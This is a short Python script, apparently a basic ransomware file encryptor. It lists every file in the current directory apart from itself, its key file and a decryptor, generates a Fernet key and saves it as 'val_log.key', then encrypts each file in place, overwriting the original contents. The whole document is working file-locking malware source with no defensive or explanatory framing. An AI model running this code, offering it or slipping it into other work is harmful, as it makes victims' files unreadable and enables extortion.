import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "bot.py" or file == "val_log.key" or file == "Decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

with open("val_log.key", "wb") as auth:
    auth.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    thedead = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(thedead)
